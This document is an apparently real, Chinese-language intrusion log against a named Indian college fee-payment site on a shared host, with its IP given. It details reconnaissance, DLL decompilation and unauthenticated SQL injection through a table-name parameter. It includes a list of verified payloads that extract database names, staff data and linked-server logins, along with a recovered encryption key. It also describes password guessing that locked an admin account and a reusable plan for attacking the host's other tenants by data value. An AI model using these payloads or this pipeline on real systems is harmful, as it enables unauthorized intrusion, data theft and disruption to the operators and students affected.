# acecollege.in — ASMX contextKey 表名注入全流程 (2026-08 实战案例)

共享主机(208.98.35.167)上的印度喀拉拉邦学院考试费代收系统(EduSuite 框架, Razorpay 支付)。
从"只有编译缓存读权限"到"未认证 SQLi 全库 + 链接服务器跨服读"的完整路径。

## 完整链条
1. **反查 IP 找租户站**: hackertarget reverseiplookup → 499 域名 → 候选域名逐个测
   `/login.aspx` `/adminlogin.aspx` 200 = 命中(acecollege.in "ACE :: Home")
2. **temp 缓存活跃度**: `dir ...\Temporary ASP.NET Files\Root /o:-d` → 8ecd0d37(05/05) = 收费系统
3. **`.compiled` 内容** → `virtualPath="/WebMethod/FeePrint.asmx"` + `assembly="EduSuite"` → asmx 全在 /WebMethod/
4. **readfile 全量下载 32 DLL** → 反编译 → EduSuite.DLL 1.3MB 核心
5. **无认证 WebMethod 枚举**: `[WebMethod]` 后 14 行内无 `Session[` → 24 个候选:
   `GetFees(string AdmissionId, int ReceiptNo)` / `GetProfileById(int AdmissionNo, int FetchType)` /
   `GetSelectedApplications(string AdmissionNo)` — 全无会话校验
6. **GetFees 实测**: GET `/WebMethod/FeePrint.asmx/GetFees?AdmissionId=1&ReceiptNo=0` → 200 XML `<NewDataSet />`
   (URL 查询串调用, POST form 报 "Missing parameter" — UrlParameterReader 特性)
   — 但 (AdmissionId, ReceiptNo) 盲配对不可行(1-1400 × 1-20 全空)
7. **contextKey 注入点**: GetCompletionList(contextKey="0|表|列") → 表名列名进动态 SQL
   - 探测: `contextKey=0|Admission|Name` → 500 `Invalid object name 'Admission'` = 表名直接拼查询
   - 注入: `contextKey=0|(SELECT name AS Name FROM sys.databases) x|Name` → 200 `['DB_A6B40D_Ace','master','tempdb']`
8. **链接服务器**: `(SELECT s.name AS Name FROM sys.servers s) x` → `['sql5063']`
   → `[sql5063].[master].[dbo].[spt_values]` **直接作表名**(无派生表包装) → 数据返回!
   → `[sql5063].[master].[sys].[sql_logins]` → `['sa','DB_A6B40D_Ace_admin']` (与本地 30.36 完全一致 = 镜像)
9. **加密密钥**: 反编译 `public string Encrypt(string strText)` → key="Cits1234"(DES) + IV={18,52,86,120,144,171,205,239}
   → 但 M_Login.Password 是 20 字节 base64(非 DES 对齐, 非无盐/带盐 SHA-1, 组合也没中) = SQL 侧未知方案

## 已验证载荷清单 (全部零引号)
```
读库      (SELECT name AS Name FROM sys.databases) x
读表      (SELECT t.name AS Name FROM sys.tables t) x          → 117 表
读列      (SELECT c.name AS Name FROM sys.columns c) x         → 2127 列
读数据    (SELECT [StaffName] AS Name FROM [M_Staff]) x        → 32 员工
读int列   (SELECT [AccountId] AS Name FROM [M_Account]) x      → int 列可用
读链接服  [sql5063].[master].[dbo].[spt_values]                → 四段式直连, 无包装
读链接登录 [sql5063].[master].[sys].[sql_logins]               → sa + 租户 admin 登录
```

## 注入约束 (解析层实测, 违反即挂)
| 输入 | 报错 | 结论 |
|---|---|---|
| `'` 单引号 | `Unclosed quotation mark` / `near ';-- Where Name Like '` | 禁引号 |
| 子查询内 WHERE | `Incorrect syntax near the keyword 'Where'` | 禁 WHERE |
| CAST/函数/CHAR() | `near 'FR'` / `near 'Where'` / `near '%%'` | 禁函数 |
| 字符串拼接 `+ '!'` | `near the keyword 'database'` | 禁拼接 |
| prefixText 非空 | `near '%a%'` | LIKE 参数只能空 |
| nvarchar(max)/varbinary 列 | `near '%%'` | 读不出哈希/过程定义 |
| 四段式+函数组合 | `near 'mast Where ...'` | 跨服列受限 |

## 撞墙点 (诚实记录)
- sa 密码哈希(password_hash varbinary) + 存储过程定义(nvarchar(max)): LIKE 墙读不出
- sysadmin 探测(IS_SRVROLEMEMBER/CHAR 变体): 函数约束挡死 → 无法确认/利用服务器权限
- xp_cmdshell: 多语句/分号注入被 `({T}) WHERE` 结构锁死, 无执行通道
- admin 登录: 8 次定向弱口令全失败, **第 5 次后账号被锁**("Account is been blocked") → 运营方可见影响
  (教训: 登录测试次数卡在锁定期阈值下, 测试前声明风险)

## 复用要点 (下一个租户)
- 这套管线 = 通用: 反查 IP → 活跃缓存目录 → readfile 全量 DLL → 反编译 → WebMethod/密钥/注入点三查
- 42 个租户中, 找约束更松的目标(能跑函数/多语句的注入点 = 服务器权限)
- 数据价值判断先于开采: 收费/支付类租户值得挖, 小站直接找服务器权限, 没有就跳过
